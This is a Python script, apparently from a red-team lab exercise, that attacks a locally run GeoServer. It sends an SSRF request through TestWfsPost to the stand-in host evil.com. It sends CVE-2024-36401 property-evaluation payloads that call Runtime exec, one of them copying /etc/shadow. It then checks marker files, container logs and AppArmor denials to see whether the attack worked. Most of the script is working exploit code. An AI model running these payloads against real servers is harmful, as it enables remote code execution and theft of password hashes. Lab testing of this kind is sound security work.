# -*- coding: utf-8 -*-
"""RT5 GeoServer: (1) re-verify TestWfsPost SSRF residual, (2) probe 36401 exec
   style (expected: env-broken via EPSD/authority failure), (3) document state."""
import subprocess

import requests
import urllib3

urllib3.disable_warnings()

BASE = "http://127.0.0.1:18082"
s = requests.Session()
s.trust_env = False
s.verify = False

# 1) SSRF residual (b)
r = s.post(BASE + "/geoserver/TestWfsPost",
           data={"url": "http://evil.com:8000/rt5/geo_ssrf_residual",
                 "body": "rt5=geo"},
           headers={"Host": "evil.com:8000"}, timeout=60)
print("[*] SSRF residual -> HTTP %s | %s" % (r.status_code, r.text[:120].replace("\n", " ")))

# 2) CVE-2024-36401 exec-style probes (property evaluation RCE)
probes = [
    ("sf:archsites", "exec(java.lang.Runtime.getRuntime(),"
                     "'touch /tmp/rt5_geo_36401')"),
    ("sf:restricted", "exec(java.lang.Runtime.getRuntime(),"
                      "'cp /etc/shadow /tmp/rt5_geo_36401')"),
]
for tn, vr in probes:
    r = s.get(BASE + "/geoserver/ows", params={
        "service": "WFS", "version": "2.0.0", "request": "GetPropertyValue",
        "typeNames": tn, "valueReference": vr,
    }, timeout=60)
    print("[*] 36401 %s -> HTTP %s | %s" % (tn, r.status_code, r.text[:150].replace("\n", " ")))

# 3) truth
r = subprocess.run(["docker", "exec", "multi-round-lab-geoserver-1", "ls", "-l", "--full-time",
                    "/tmp/rt5_geo_36401", "/tmp/rt5_geo_36401_2",
                    "/mnt/geoserver/rt5_geo_marker"], capture_output=True, text=True)
print((r.stdout + r.stderr).strip())

r = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "2m"],
                   capture_output=True, text=True)
for line in (r.stdout + r.stderr).splitlines():
    if "/rt5/geo" in line:
        print("[infra] " + line[:200])

print("=== audit (aa-geoserver recent denials) ===")
r = subprocess.run(["wsl", "-u", "root", "--", "bash", "-c",
                    "dmesg | grep 'apparmor=\"DENIED\"' | grep 'aa-geoserver' | grep -v getent | tail -5"],
                   capture_output=True, text=True)
print(r.stdout + r.stderr)
